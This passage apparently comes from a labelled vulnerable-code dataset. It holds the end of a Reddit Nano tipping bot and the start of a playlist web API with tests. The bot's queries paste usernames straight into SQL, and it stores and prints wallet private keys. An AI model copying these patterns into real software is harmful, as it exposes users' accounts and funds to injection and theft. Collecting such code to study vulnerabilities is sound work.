currently deactivated\r\ndef handle_private_key(message):\r\n    author = str(message.author)\r\n    message_time = datetime.utcfromtimestamp(message.created_utc)  # time the reddit message was created\r\n    add_history_record(\r\n        username=str(message.author),\r\n        comment_or_message='message',\r\n        reddit_time=message_time.strftime('%Y-%m-%d %H:%M:%S'),\r\n        action='private_key',\r\n        comment_text=str(message.body)[:255]\r\n    )\r\n    mycursor.execute(\"SELECT address, private_key FROM accounts WHERE name='%s'\" %author)\r\n    result = mycursor.fetchall()\r\n    if len(result) > 0:\r\n        response = 'Your account: %s\\n\\nYour private key: %s'%(result[0][0],result[0][1])\r\n        x = reddit.redditor(username).message('New Private Key', response)\r\n        return None\r\n    else:\r\n        x = reddit.redditor(username).message(\"No account found.\",\"You do not currently have an account open.\"\r\n                                                                \"To create one, respond with the text 'create' in the message body.\")\r\n        return None\r\n\r\n\r\n#updated\r\ndef handle_balance(message):\r\n    username = str(message.author)\r\n    message_time = datetime.utcfromtimestamp(message.created_utc)  # time the reddit message was created\r\n    add_history_record(\r\n        username=str(message.author),\r\n        comment_or_message='message',\r\n        reddit_time=message_time.strftime('%Y-%m-%d %H:%M:%S'),\r\n        action='balance',\r\n        comment_text=str(message.body)[:255]\r\n    )\r\n\r\n    mycursor.execute(\"SELECT address FROM accounts WHERE username='%s'\" % username)\r\n    result = mycursor.fetchall()\r\n    if len(result)>0:\r\n        results = check_balance(result[0][0])\r\n\r\n        response = \"At address %s, you currently have %s Nano available, and %s Nano unpocketed. To pocket any, create a new \" \\\r\n                   \"message containing the word 'receive'\\n\\nhttps://www.nanode.co/account/%s\" % (result[0][0], results[0]/10**30, results[1]/10**30,result[0][0])\r\n        reddit.redditor(username).message('Nano Tipper Z account balance', response)\r\n        return None\r\n\r\n    reddit.redditor(username).message('Nano Tipper Z: No account registered.', 'You do not have an open account yet')\r\n\r\n# currently deactivated\r\ndef handle_new_address(message):\r\n    message_time = datetime.utcfromtimestamp(message.created_utc)  # time the reddit message was created\r\n    add_history_record(\r\n        username=str(message.author),\r\n        comment_or_message='message',\r\n        action='new_address',\r\n        reddit_time=message_time.strftime('%Y-%m-%d %H:%M:%S'),\r\n        comment_text=str(message.body)[:255]\r\n    )\r\n    message.reply('not activated yet.')\r\n\r\n\r\n#updated\r\ndef handle_send(message):\r\n    parsed_text = str(message.body).lower().replace('\\\\', '').split('\\n')[0].split(' ')\r\n    response = handle_send_nano(message, parsed_text, 'message')\r\n    message.reply(response + comment_footer)\r\n\r\n\r\n#updated\r\ndef handle_send_nano(message, parsed_text, comment_or_message):\r\n    user_or_address = '' # either 'user' or 'address', depending on how the recipient was specified\r\n    private_key = ''\r\n    adrress = ''\r\n    recipient = ''\r\n    recipient_username = ''\r\n    recipient_address = ''\r\n    message_time = datetime.utcfromtimestamp(message.created_utc) # time the reddit message was created\r\n    username = str(message.author) # the sender\r\n\r\n    entry_id = add_history_record(\r\n        username=username,\r\n        action='send',\r\n        comment_or_message=comment_or_message,\r\n        comment_id=message.id,\r\n        reddit_time=message_time.strftime('%Y-%m-%d %H:%M:%S'),\r\n        comment_text=str(message.body)[:255]\r\n        )\r\n\r\n    # check if the message body was parsed into 2 or 3 words. If it wasn't, update the history db\r\n    # with a failure and return the message. If the length is 2 (meaning recipient is parent author) we will\r\n    # check that after tip amounts to limit API requests\r\n    if len(parsed_text) >= 3:\r\n        amount = parsed_text[1]\r\n        recipient = parsed_text[2]\r\n    elif len(parsed_text) == 2:\r\n        # parse the user info in a later block of code to minimize API requests\r\n        pass\r\n    else:\r\n        sql = \"UPDATE history SET notes = %s WHERE id = %s\"\r\n        val = ('could not find tip amount', entry_id)\r\n        mycursor.execute(sql, val)\r\n        mydb.commit()\r\n        return 'Could not read your tip or send command, or find an amount. Be sure the amount and recipient are separated by a space.'\r\n\r\n\r\n    # check that the tip amount is a number, and if it is high enough\r\n    # we will also check if the tip amount is above the user minimum after we get user information\r\n    if parsed_text[1].lower() == 'nan' or ('inf' in parsed_text[1].lower()):\r\n        sql = \"UPDATE history SET notes = %s WHERE id = %s\"\r\n        val = ('could not parse amount', entry_id)\r\n        mycursor.execute(sql, val)\r\n        mydb.commit()\r\n        return \"Could not read your tip or send amount. Is '%s' a number?\" % parsed_text[1]\r\n\r\n    try:\r\n        amount = float(parsed_text[1])\r\n    except:\r\n        sql = \"UPDATE history SET notes = %s WHERE id = %s\"\r\n        val = ('could not parse amount', entry_id)\r\n        mycursor.execute(sql, val)\r\n        mydb.commit()\r\n        return \"Could not read your tip or send amount. Is '%s' a number?\" % parsed_text[1]\r\n\r\n    if amount < program_minimum:\r\n        sql = \"UPDATE history SET notes = %s WHERE id = %s\"\r\n        val = ('amount below program limit', entry_id)\r\n        mycursor.execute(sql, val)\r\n        mydb.commit()\r\n        return 'You must send amounts of Nano above the program limit of %s.' % program_minimum\r\n\r\n    # check if author has an account, and if they have enough funds\r\n    mycursor.execute(\"SELECT address, private_key FROM accounts WHERE username='%s'\" % username)\r\n    result = mycursor.fetchall()\r\n    if len(result) < 1:\r\n        sql = \"UPDATE history SET notes = %s WHERE id = %s\"\r\n        val = ('sender does not have an account', entry_id)\r\n        mycursor.execute(sql, val)\r\n        mydb.commit()\r\n\r\n        return 'You do not have a tip bot account yet. To create one, send me a PM containing the'\\\r\n               \" text 'create' in the message body, or get a tip from a fellow redditor!.\"\r\n    else:\r\n        address = result[0][0]\r\n        private_key = result[0][1]\r\n        results = check_balance(result[0][0])\r\n        if nano_to_raw(amount) > results[0]:\r\n            sql = \"UPDATE history SET notes = %s WHERE id = %s\"\r\n            val = ('insufficient funds', entry_id)\r\n            mycursor.execute(sql, val)\r\n            mydb.commit()\r\n            return 'You have insufficient funds. Your account has %s pocketed (+%s unpocketed) and you are '\\\r\n                          'trying to send %s. If you have unpocketed funds, create a new message containing the text'\\\r\n                          ' \"receive\" to pocket your incoming money.'%(results[0]/10**30, results[1]/10**30, amount)\r\n\r\n    # if there was only the command and the amount, we need to find the recipient.\r\n    # if it was a comment, the recipient is the parent author\r\n    # if it was a message, the program will respond with an error\r\n    if len(parsed_text) == 2:\r\n        if comment_or_message == 'comment':\r\n            recipient = str(message.parent().author)\r\n        else:\r\n            sql = \"UPDATE history SET notes = %s, WHERE id = %s\"\r\n            val = (\"no recipient specified\", entry_id)\r\n            mycursor.execute(sql, val)\r\n            mydb.commit()\r\n            return \"You must specify an amount and a user.\"\r\n\r\n    # remove the /u/ if a redditor was specified\r\n    if recipient[:3].lower() == '/u/':\r\n        recipient = recipient[3:]\r\n        print(recipient)\r\n\r\n    # recipient -- first check if it is a valid address. Otherwise, check if it's a redditor\r\n    if (recipient[:5].lower() == \"nano_\") or (recipient[:4].lower() == \"xrb_\"):\r\n        # check valid address\r\n        success = validate_address(recipient)\r\n        if success['valid'] == '1':\r\n            user_or_address = 'address'\r\n        # if not, check if it is a redditor disguised as an address (e.g. nano_is_awesome, xrb_for_life)\r\n        else:\r\n            try:\r\n                print(getattr(reddit.redditor(recipient), 'is_suspended', False))\r\n                user_or_address = 'user'\r\n            except:\r\n                # not a valid address or a redditor\r\n                sql = \"UPDATE history SET notes = %s WHERE id = %s\"\r\n                val = ('invalid address or address-like redditor does not exist', entry_id)\r\n                mycursor.execute(sql, val)\r\n                mydb.commit()\r\n                return '%s is neither a valid address or redditor' % recipient\r\n    else:\r\n        try:\r\n            print(getattr(reddit.redditor(recipient), 'is_suspended', False))\r\n            user_or_address = 'user'\r\n        except:\r\n            sql = \"UPDATE history SET notes = %s WHERE id = %s\"\r\n            val = ('redditor does not exist', entry_id)\r\n            mycursor.execute(sql, val)\r\n            mydb.commit()\r\n            return \"Could not find redditor %s. Make sure you aren't writing or copy/pasting markdown.\" % recipient\r\n\r\n    # at this point:\r\n    # 'amount' is a valid positive number and above the program minimum\r\n    # 'username' has a valid account and enough Nano for the tip\r\n    # 'user_or_address' is either 'user' or 'address',\r\n    # 'recipient' is either a valid redditor or a valid Nano address\r\n\r\n    user_minimum = -1\r\n    # if a user is specified, reassign that as the username\r\n    if user_or_address == 'user':\r\n        #try to get the username information\r\n        recipient_username = recipient\r\n        sql = \"SELECT minimum, address FROM accounts WHERE username = %s\"\r\n        val = (recipient_username,)\r\n        mycursor.execute(sql, val)\r\n        myresult = mycursor.fetchall()\r\n        # if there is a result, pull out the minimum (in raw) and nano address for the recipient\r\n        if len(myresult) > 0:\r\n            print(myresult[0])\r\n            user_minimum = int(myresult[0][0])\r\n            recipient_address = myresult[0][1]\r\n    else:\r\n        # if the recipient is an address, check if they have an account\r\n        recipient_address = recipient\r\n        recipient_username = check_registered_by_address(recipient_address)\r\n        if recipient_username:\r\n            sql = \"SELECT minimum, address FROM accounts WHERE username = %s\"\r\n            val = (recipient_username,)\r\n            mycursor.execute(sql, val)\r\n            myresult = mycursor.fetchall()\r\n            print(myresult[0])\r\n            user_minimum = float(myresult[0][0])\r\n\r\n    # if either we had an account or address which has been registered, recipient_address and recipient_username will\r\n    # have values instead of being ''. We will check the minimum\r\n    if (user_minimum >= 0) and recipient_address and recipient_username:\r\n        if nano_to_raw(amount) < user_minimum:\r\n            sql = \"UPDATE history SET notes = %s WHERE id = %s\"\r\n            val = (\"below user minimum\", entry_id)\r\n            mycursor.execute(sql, val)\r\n            mydb.commit()\r\n\r\n            return \"Sorry, the user has set a tip minimum of %s. Your tip of %s is below this amount.\"%(user_minimum/10**30, amount)\r\n\r\n        if user_or_address == 'user':\r\n            notes = \"sent to registered redditor\"\r\n        else:\r\n            notes = \"sent to registered address\"\r\n\r\n        receiving_new_balance = check_balance(recipient_address)\r\n        sql = \"UPDATE history SET notes = %s, address = %s, username = %s, recipient_username = %s, recipient_address = %s, amount = %s WHERE id = %s\"\r\n        val = (notes, address, username, recipient_username, recipient_address, str(nano_to_raw(amount)), entry_id)\r\n        mycursor.execute(sql, val)\r\n        mydb.commit()\r\n        print(\"Sending Nano: \", address, private_key, nano_to_raw(amount), recipient_address, recipient_username)\r\n        sent = send(address, private_key, nano_to_raw(amount), recipient_address)\r\n        print(\"Hash: \", sent)\r\n        sql = \"UPDATE history SET hash = %s WHERE id = %s\"\r\n        val = (sent['hash'], entry_id)\r\n        mycursor.execute(sql, val)\r\n        mydb.commit()\r\n\r\n        x = reddit.redditor(recipient_username).message('You just received a new Nano tip!',\r\n                                                    'You have been tipped %s Nano at your address of %s. Your new account balance will be '\r\n                                                    '%s received and %s unpocketed.' % (\r\n                                                    amount, recipient_address, receiving_new_balance[0] / 10 ** 30,\r\n                                                    (receiving_new_balance[1] / 10 ** 30 + amount)))\r\n\r\n        if user_or_address == 'user':\r\n            return \"Sent %s Nano to %s.\" % (amount, recipient_username)\r\n        else:\r\n            return \"Sent %s Nano to %s.\" % (amount, recipient_address)\r\n\r\n    elif recipient_address:\r\n        # or if we have an address but no account, just send\r\n        sql = \"UPDATE history SET notes = %s, address = %s, username = %s, recipient_address = %s, amount = %s WHERE id = %s\"\r\n        val = (\r\n            'sent to unregistered address', address, username, recipient_address, str(nano_to_raw(amount)), entry_id)\r\n        mycursor.execute(sql, val)\r\n        mydb.commit()\r\n\r\n        print(\"Sending Unregistered Address: \", address, private_key, nano_to_raw(amount), recipient_address)\r\n\r\n        sent = send(address, private_key, nano_to_raw(amount), recipient_address)\r\n        print(\"Hash: \", sent)\r\n        sql = \"UPDATE history SET hash = %s WHERE id = %s\"\r\n        val = (sent['hash'], entry_id)\r\n        mycursor.execute(sql, val)\r\n        mydb.commit()\r\n        return \"Sent %s Nano to address %s.\" % (amount, recipient_address)\r\n\r\n    else:\r\n        # create a new account for redditor\r\n        recipient_address = add_new_account(recipient_username)\r\n\r\n\r\n        x = reddit. \\\r\n            redditor(recipient_username). \\\r\n            message('Congrats on receiving your first Nano Tip!',\r\n                    'Welcome to Nano Tip Bot! You have just received a Nano tip in the amount of %s at your address '\r\n                    'of %s. Here is some boilerplate.\\n\\n' % (\r\n                    amount, recipient_address) + help_text)\r\n\r\n        sql = \"UPDATE history SET notes = %s, address = %s, username = %s, recipient_username = %s, recipient_address = %s, amount = %s WHERE id = %s\"\r\n        val = (\r\n        \"new user created\", address, username, recipient_username, recipient_address, str(nano_to_raw(amount)), entry_id)\r\n        mycursor.execute(sql, val)\r\n        mydb.commit()\r\n\r\n        sent = send(address, private_key, nano_to_raw(amount), recipient_address)\r\n        print(\"Hash: \", sent)\r\n\r\n        sql = \"UPDATE history SET hash = %s WHERE id = %s\"\r\n        val = (sent['hash'], entry_id)\r\n        mycursor.execute(sql, val)\r\n        mydb.commit()\r\n        print(\"Sending New Account Address: \", address, private_key, nano_to_raw(amount), recipient_address, recipient_username)\r\n        return \"Creating a new account for %s and \"\\\r\n                      \"sending %s Nano.\" % (recipient_username, amount)\r\n\r\n\r\ndef handle_receive(message):\r\n    message_time = datetime.utcfromtimestamp(message.created_utc)\r\n    username = str(message.author)\r\n    # find any accounts associated with the redditor\r\n    mycursor.execute(\"SELECT address, private_key FROM accounts WHERE username='%s'\" % username)\r\n    result = mycursor.fetchall()\r\n    if len(result) > 0:\r\n\r\n        open_or_receive(result[0][0], result[0][1])\r\n        balance = check_balance(result[0][0])\r\n        add_history_record(\r\n            username=username,\r\n            action='receive',\r\n            reddit_time=message_time.strftime('%Y-%m-%d %H:%M:%S'),\r\n            address=result[0][0],\r\n            comment_or_message='message'\r\n        )\r\n        response = \"You currently have %s Nano available, and %s Nano unpocketed. To pocket any, create a new \" \\\r\n                   \"message containing the word 'receive' in the body\" % (balance[0] / 10 ** 30, balance[1] / 10 ** 30)\r\n        message.reply(response)\r\n    else:\r\n        add_history_record(\r\n            username=username,\r\n            action='receive',\r\n            reddit_time=message_time.strftime('%Y-%m-%d %H:%M:%S'),\r\n            comment_or_message='message'\r\n        )\r\n        response = \"You do not currently have an account open. To create one, respond with the text 'create' in the message body.\"\r\n        message.reply(response)\r\n\r\n# updated\r\ndef handle_minimum(message):\r\n    message_time = datetime.utcfromtimestamp(message.created_utc)  # time the reddit message was created\r\n    # user may select a minimum tip amount to avoid spamming. Tipbot minimum is 0.001\r\n    username = str(message.author)\r\n    # find any accounts associated with the redditor\r\n    parsed_text = message.body.replace('\\\\', '').split('\\n')[0].split(' ')\r\n\r\n    # there should be at least 2 words, a minimum and an amount.\r\n    if len(parsed_text) < 2:\r\n        response = \"I couldn't parse your command. I was expecting 'minimum <amount>'. Be sure to check your spacing.\"\r\n        message.reply(response)\r\n        return None\r\n    # check that the minimum is a number\r\n\r\n    if parsed_text[1].lower() == 'nan' or ('inf' in parsed_text[1].lower()):\r\n        response = \"'%s' didn't look like a number to me. If it is blank, there might be extra spaces in the command.\"\r\n        message.reply(response)\r\n    try:\r\n        amount = float(parsed_text[1])\r\n    except:\r\n        response = \"'%s' didn't look like a number to me. If it is blank, there might be extra spaces in the command.\"\r\n        message.reply(response)\r\n\r\n    # check that it's greater than 0.01\r\n    if nano_to_raw(amount) < nano_to_raw(0.01):\r\n        response = \"The overall tip minimum is 0.01 Nano.\"\r\n        message.reply(response)\r\n\r\n    # check if the user is in the database\r\n    sql = \"SELECT address FROM accounts WHERE username=%s\"\r\n    val = (username, )\r\n    mycursor.execute(sql, val)\r\n    result = mycursor.fetchall()\r\n    print(result)\r\n    if len(result) > 0:\r\n        #open_or_receive(result[0][0], result[0][1])\r\n        #balance = check_balance(result[0][0])\r\n        add_history_record(\r\n            username=username,\r\n            action='minimum',\r\n            amount=nano_to_raw(amount),\r\n            address=result[0][0],\r\n            comment_or_message='message',\r\n            reddit_time=message_time.strftime('%Y-%m-%d %H:%M:%S'),\r\n            comment_text=str(message.body)[:255]\r\n        )\r\n        sql = \"UPDATE accounts SET minimum = %s WHERE username = %s\"\r\n        print(amount)\r\n        print(nano_to_raw(amount))\r\n        val = (str(nano_to_raw(amount)), username)\r\n        print(val)\r\n        mycursor.execute(sql, val)\r\n        mydb.commit()\r\n        response = \"Updating tip minimum to %s\"%amount\r\n        message.reply(response)\r\n    else:\r\n        add_history_record(\r\n            username=username,\r\n            action='minimum',\r\n            reddit_time=message_time.strftime('%Y-%m-%d %H:%M:%S'),\r\n            amount=nano_to_raw(amount),\r\n            comment_text=str(message.body)[:255]\r\n        )\r\n        response = \"You do not currently have an account open. To create one, respond with the text 'create' in the message body.\"\r\n        message.reply(response)\r\n\r\n\r\n# updated\r\ndef handle_help(message):\r\n    message_time = datetime.utcfromtimestamp(message.created_utc)  # time the reddit message was created\r\n    add_history_record(\r\n        username=str(message.author),\r\n        action='help',\r\n        comment_or_message='message',\r\n        reddit_time=message_time.strftime('%Y-%m-%d %H:%M:%S')\r\n        )\r\n    response = help_text\r\n    message.reply(response)\r\n\r\n\r\n# updated\r\ndef handle_comment(message):\r\n    # remove an annoying extra space that might be in the front\r\n    if message.body[0] == ' ':\r\n        parsed_text = str(message.body[1:]).lower().replace('\\\\', '').split('\\n')[0].split(' ')\r\n    else:\r\n        parsed_text = str(message.body).lower().replace('\\\\', '').split('\\n')[0].split(' ')\r\n    print(parsed_text)\r\n    print(len(parsed_text))\r\n    response = handle_send_nano(message, parsed_text, 'comment')\r\n    message.reply(response + comment_footer)\r\n\r\n\r\ndef handle_message(message):\r\n    message_body = str(message.body).lower()\r\n    print(\"Body: **\", message_body, \"**\")\r\n    if message.body[0] == ' ':\r\n        parsed_text = str(message.body[1:]).lower().replace('\\\\', '').split('\\n')[0].split(' ')\r\n    else:\r\n        parsed_text = str(message.body).lower().replace('\\\\', '').split('\\n')[0].split(' ')\r\n    print(\"Parsed Text:\", parsed_text)\r\n\r\n    if parsed_text[0].lower() == 'help':\r\n        print(\"Helping\")\r\n        handle_help(message)\r\n\r\n    elif parsed_text[0].lower() == 'minimum':\r\n        print(\"Setting Minimum\")\r\n        handle_minimum(message)\r\n\r\n    elif parsed_text[0].lower() == 'create':\r\n        print(\"Creating\")\r\n        handle_create(message)\r\n\r\n    elif parsed_text[0].lower() == 'private_key':\r\n        print(\"private_keying\")\r\n        # handle_private_key(message)\r\n\r\n    elif parsed_text[0].lower() == 'new_address':\r\n        print(\"new address\")\r\n        # handle_new_address(message)\r\n\r\n    elif parsed_text[0].lower() == 'send':\r\n        print(\"send via PM\")\r\n        handle_send(message)\r\n\r\n    elif parsed_text[0].lower() == 'receive':\r\n        print(\"receive\")\r\n        handle_receive(message)\r\n\r\n    elif parsed_text[0].lower() == 'balance':\r\n        print(\"balance\")\r\n        handle_balance(message)\r\n    else:\r\n        add_history_record(\r\n            username=str(message.author),\r\n            comment_text=str(message.body)[:255],\r\n            comment_or_message='message',\r\n        )\r\n\r\n\r\n# main loop\r\nfor action_item in stream_comments_messages():\r\n    if action_item is None:\r\n        pass\r\n        #print('No news.')\r\n    elif action_item[0] == 'comment':\r\n        print(time.strftime('%Y-%m-%d %H:%M:%S'))\r\n        print('Comment: ', action_item[1].author, action_item[1].body[:20])\r\n        if action_item[1].body[0]==' ':\r\n            parsed_text = str(action_item[1].body[1:]).lower().replace('\\\\', '').split('\\n')[0].split(' ')\r\n        else:\r\n            parsed_text = str(action_item[1].body).lower().replace('\\\\', '').split('\\n')[0].split(' ')\r\n        print('Parsed comment: ', parsed_text)\r\n        if parsed_text[0] == r'!nano_tip':\r\n            print('\\n')\r\n            print('*****************************************************')\r\n            print('found an item.')\r\n            handle_comment(action_item[1])\r\n\r\n    elif action_item[0] == 'message':\r\n        if action_item[1].author == 'nano_tipper_z':\r\n            pass\r\n        else:\r\n            print(time.strftime('%Y-%m-%d %H:%M:%S'))\r\n            print('A new message was found %s, sent by %s.'%(action_item[1], action_item[1].author ))\r\n            handle_message(action_item[1])\r\n\r\n\r\n\r\n/n/n/n", "label": 1}, {"id": "666e52c5f0b8c1f4296e84471637033d9542a7a6", "code": "main_test.py/n/nimport pytest\nimport bottle\nimport webtest\nimport MySQLdb\nimport os\n\nfrom logging import getLogger\nfrom bottle_mysql import Plugin\n\nfrom video import video_api\nfrom playlist import playlist_api\n\nfrom database import populate_test_database\n\nlogger = getLogger()\n\napp = bottle.default_app()\nplugin = Plugin(dbuser=os.environ[\"USER\"], dbpass=os.environ[\"PASSWORD\"], dbname='test')\napp.install(plugin)\ntest_app = webtest.TestApp(app)\n\n\ndef create_video(playlist_id, title, thumbnail, position):\n    db = connect_to_database()\n    cursor = db.cursor()\n    cursor.execute(\n        \"INSERT INTO video (playlist_id, title, thumbnail, position) VALUES(%s, %s, %s, %s);\", (playlist_id, title, thumbnail, position,))\n    db.commit()\n    db.close()\n\n\ndef create_playlist(name):\n    db = connect_to_database()\n    cursor = db.cursor()\n    cursor.execute(\n        \"INSERT INTO playlist (name, video_position) VALUES(%s, 0);\", (name,))\n    db.commit()\n    db.close()\n\n\ndef connect_to_database():\n    db = MySQLdb.connect(\"localhost\", \"root\", os.environ[\"PASSWORD\"], 'test')\n    return db\n\n\ndef test_should_return_all_playlists():\n    populate_test_database()\n\n    create_playlist('first playlist')\n    create_playlist('second playlist')\n\n    response = test_app.get('/playlists')\n    assert response.json['status'] == 'OK'\n    assert response.json['data'] == [dict(id=1, name='first playlist'),\n                                     dict(id=2, name='second playlist')]\n\n\ndef test_should_return_a_playlist():\n    populate_test_database()\n\n    create_playlist('first playlist')\n\n    response = test_app.get('/playlists/1')\n    assert response.json['status'] == 'OK'\n    assert response.json['data'] == dict(\n        id=1, name='first playlist', video_position=0)\n\n\ndef test_should_create_a_playlist():\n    populate_test_database()\n\n    response = test_app.post('/playlists/nn')\n    assert response.json['status'] == 'OK'\n\n    response2 = test_app.get('/playlists')\n    assert response2.json['status'] == 'OK'\n    assert response2.json['data'] == [dict(id=1, name='nn')]\n\n\ndef test_should_update_a_playlist_name():\n    populate_test_database()\n\n    response = test_app.post('/playlists/nn')\n    assert response.json['status'] == 'OK'\n\n    response2 = test_app.put('/playlists/1/name')\n    assert response2.json['status'] == 'OK'\n\n    response3 = test_app.get('/playlists')\n    assert response3.json['status'] == 'OK'\n    assert response3.json['data'] == [dict(id=1, name='name')]\n\n\ndef test_should_delete_a_playlist_and_remove_all_its_videos():\n    populate_test_database()\n\n    create_playlist('first playlist')\n    create_video(1, 'the title of the video',\n                 'the url of the video', 1)\n    create_video(1, 'the title of the video',\n                 'the url of the video', 2)\n\n    response = test_app.delete('/playlists/1')\n    assert response.json['status'] == 'OK'\n\n    response2 = test_app.get('/playlists/1')\n    assert response2.json['status'] == 'OK'\n    assert response2.json['data'] == None\n\n    response3 = test_app.get('/videos/1')\n    assert response3.json['status'] == 'OK'\n    assert response3.json['data'] == []\n\n\ndef test_should_return_all_the_videos_from_a_playlist():\n    populate_test_database()\n\n    create_playlist('first playlist')\n    create_video(1, 'the title of the video',\n                 'the url of the video', 1)\n    create_video(1, 'the title of the video',\n                 'the url of the video', 2)\n\n    response = test_app.get('/videos/1')\n    assert response.json['status'] == 'OK'\n    assert response.json['data'] == [dict(id=1, title='the title of the video',\n                                          thumbnail='the url of the video', position=1),\n                                     dict(id=2, title='the title of the video',\n                                          thumbnail='the url of the video', position=2)]\n\n\ndef test_should_return_all_the_videos():\n    populate_test_database()\n\n    create_playlist('first playlist')\n    create_playlist('second playlist')\n    create_video(1, 'f title',\n                 'f url', 1)\n    create_video(1, 's title',\n                 's url', 2)\n    create_video(1, 't title',\n                 't url', 3)\n    create_video(2, 'f title',\n                 'f url', 1)\n    create_video(2, 'fh title',\n                 'fh url', 2)\n\n    response = test_app.get('/videos')\n    assert response.json['status'] == 'OK'\n    assert response.json['data'] == [dict(id=1, playlist_id=1, title='f title',\n                                          thumbnail='f url', position=1),\n                                     dict(id=2, playlist_id=1, title='s title',\n                                          thumbnail='s url', position=2),\n                                     dict(id=3, playlist_id=1, title='t title',\n                                          thumbnail='t url', position=3),\n                                     dict(id=4, playlist_id=2, title='f title',\n                                          thumbnail='f url', position=1),\n                                     dict(id=5, playlist_id=2, title='fh title',\n                                          thumbnail='fh url', position=2)]\n\n\ndef test_should_create_a_video():\n    populate_test_database()\n\n    create_playlist('first playlist')\n\n    response = test_app.post('/videos/1/title/thumbnail')\n    assert response.json['status'] == 'OK'\n\n    response2 = test_app.post('/videos/1/title2/thumbnail2')\n    assert response2.json['status'] == 'OK'\n\n    response3 = test_app.get('/videos/1')\n    assert response3.json['status'] == 'OK'\n    assert response3.json['data'] == [dict(id=1, title='title', thumbnail='thumbnail', position=1),\n                                      dict(id=2, title='title2', thumbnail='thumbnail2', position=2)]\n\n\ndef test_should_update_a_video_position():\n    populate_test_database()\n\n    create_playlist('first playlist')\n\n    create_video(1, 'title', 'thumbnail', 1)\n    create_video(1, 'title2', 'thumbnail2', 2)\n    create_video(1, 'title3', 'thumbnail3', 3)\n    create_video(1, 'title4', 'thumbnail4', 4)\n\n    response = test_app.put('/videos/4/1/2')\n    assert response.json['status'] == 'OK'\n\n    response2 = test_app.get('/videos/1')\n    assert response2.json['status'] == 'OK'\n    assert response2.json['data'] == [dict(id=1, title='title', thumbnail='thumbnail', position=1),\n                                      dict(id=4, title='title4',\n                                           thumbnail='thumbnail4', position=2),\n                                      dict(id=2, title='title2',\n                                           thumbnail='thumbnail2', position=3),\n                                      dict(id=3, title='title3', thumbnail='thumbnail3', position=4)]\n\n\ndef test_should_delete_a_video_given_an_id_and_update_playlist_video_position():\n    populate_test_database()\n\n    create_playlist('first playlist')\n\n    response = test_app.post('/videos/1/title/thumbnail')\n    assert response.json['status'] == 'OK'\n\n    response2 = test_app.delete('/videos/1/1')\n    assert response2.json['status'] == 'OK'\n\n    response3 = test_app.get('/videos/1')\n    assert response3.json['status'] == 'OK'\n    assert response3.json['data'] == []\n\n    response4 = test_app.get('/playlists/1')\n\n    assert response4.json['status'] == 'OK'\n    assert response4.json['data'] == dict(\n        id=1, name='first playlist', video_position=0)\n\n\ndef test_should_reorder_video_position_given_a_deleted_video():\n    populate_test_database()\n\n    create_playlist('first playlist')\n\n    response = test_app.post('/videos/1/title/thumbnail')\n    assert response.json['status'] == 'OK'\n\n    response2 = test_app.post('/videos/1/title2/thumbnail2')\n    assert response2.json['status'] == 'OK'\n\n    response3 = test_app.post('/videos/1/title3/thumbnail3')\n    assert response3.json['status'] == 'OK'\n\n    response4 = test_app.delete('/videos/2/1')\n    assert response4.json['status'] == 'OK'\n\n    response5 = test_app.get('/videos/1')\n    assert response.json['status'] == 'OK'\n    assert response5.json['data'] == [dict(id=1, title='title', thumbnail='thumbnail', position=1),\n                                      dict(id=3, title='title3', thumbnail='thumbnail3', position=2)]\n\n    response6 = test_app.get('/playlists/1')\n    assert response6.json['status'] == 'OK'\n    assert response6.json['data'] == dict(\n        id=1, name='first playlist', video_position=2)\n\n\ndef test_should_return_a_not_ok_status_when_deleting_an_unknown_playlist_id():\n    populate_test_database()\n\n    create_playlist('first playlist')\n\n    response = test_app.delete('/playlists/2')\n    assert response.json['status'] == 'NOK'\n    assert response.json['message'] != None\n\n\ndef test_should_return_a_not_ok_status_when_updating_an_unknown_playlist_id():\n    populate_test_database()\n\n    create_playlist('first playlist')\n\n    response = test_app.put('/playlists/2/name')\n    assert response.json['status'] == 'NOK'\n    assert response.json['message'] != None\n\n\ndef test_should_return_a_not_ok_status_when_creating_a_video_from_an_unknown_playlist_id():\n    populate_test_database()\n\n    create_playlist('first playlist')\n\n    response = test_app.post('/videos/2/title/thumbnail')\n\n    assert response.json['status'] == 'NOK'\n    assert response.json['message'] != None\n\n\ndef test_should_return_a_not_ok_status_when_updating_a_video_from_an_unknown_id():\n    populate_test_database()\n\n    response = test_app.put('/videos/1/1/2')\n    assert response.json['status'] == 'NOK'\n    assert response.json['message'] != None\n\n\ndef test_should_return_a_not_ok_status_when_either_specifying_an_out_of_bounds_or_similar_position():\n    populate_test_database()\n\n    create_video(1, 'title', 'thumbnail', 1)\n    create_video(1, 'title2', 'thumbnail2', 2)\n\n    response = test_app.put('/videos/1/1/2')\n    assert response.json['status'] == 'NOK'\n    assert response.json['message'] != None\n\n    response2 = test_app.put('/videos/1/1/5')\n    assert response2.json['status'] == 'NOK'\n    assert response2.json['message'] != None\n\n\ndef test_should_return_a_not_ok_status_when_deleting_a_video_from_an_unknown_playlist_id():\n    populate_test_database()\n\n    create_playlist('first playlist')\n\n    response = test_app.post('/videos/1/title/thumbnail')\n    assert response.json['status'] == 'OK'\n\n    response = test_app.delete('/videos/1/2')\n    assert response.json['status'] == 'NOK'\n    assert response.json['message'] != None\n\n\ndef test_should_return_a_not_ok_status_when_deleting_a_video_not_from_a_given_playlist():\n    populate_test_database()\n\n    create_playlist('first playlist')\n\n    response = test_app.post('/videos/1/title/thumbnail')\n    assert response.json['status'] == 'OK'\n\n    response = test_app.delete('/videos/2/1')\n    assert response.json['status'] == 'NOK'\n    assert response.json['message'] != None\n/n/n/nplaylist/playlist_repository.py/n/n\"\"\"This module is the playlist repository in charge of all database requests.\"\"\"\n\n\ndef retrieve_playlists(db):\n    db.execute('SELECT id, name from playlist;')\n    rows = db.fetchall()\n    return rows\n\n\ndef retrieve_playlist_by_id(id, db):\n    db.execute(\n        \"SELECT id, name, video_position from playlist WHERE id=%s;\", (id,))\n    row = db.fetchone()\n    return row\n\n\ndef delete_playlist(id, db):\n    db.execute(\"DELETE FROM playlist where id=%s;\", (id,))\n\n\ndef update_playlist(id, name, db):\n    db.execute(\"UPDATE playlist SET name=%s WHERE id=%s;\", (name, id,))\n\n\ndef update_playlist_video_position(id, position, db):\n    db.execute(\"UPDATE playlist SET video_position=%s WHERE id=%s;\",\n               (position, id))\n\n\ndef create_playlist(name, db):\n    db.execute(\n        \"INSERT INTO playlist (name, video_position) VALUES(%s, 0);\", (name,))\n/n/n/nvideo/video_repository.py/n/n\"\"\"This module is the video repository in charge of all database requests.\"\"\"\n\n\ndef retrieve_videos_from_playlist(playlist_id, db):\n    db.execute(\"SELECT id, title, thumbnail, position from video WHERE playlist_id=%s ORDER BY position ASC;\", 